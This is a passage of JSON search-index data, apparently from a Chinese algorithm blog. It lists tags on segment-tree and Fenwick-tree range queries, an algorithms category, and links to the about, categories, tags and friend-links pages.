的数","slug":"线段树——区间查询第一个大于-x-的数","link":"/tags/%E7%BA%BF%E6%AE%B5%E6%A0%91%E2%80%94%E2%80%94%E5%8C%BA%E9%97%B4%E6%9F%A5%E8%AF%A2%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%A4%A7%E4%BA%8E-x-%E7%9A%84%E6%95%B0/"},{"name":"树状数组——区间最大值","slug":"树状数组——区间最大值","link":"/tags/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84%E2%80%94%E2%80%94%E5%8C%BA%E9%97%B4%E6%9C%80%E5%A4%A7%E5%80%BC/"}],"categories":[{"name":"算法","slug":"算法","link":"/categories/%E7%AE%97%E6%B3%95/"}],"pages":[{"title":"关于","text":"","link":"/about/index.html"},{"title":"分类","text":"","link":"/categories/index.html"},{"title":"标签","text":"","link":"/tags/index.html"},{"title":"友链","text":"","link":"/link/index.html"}]}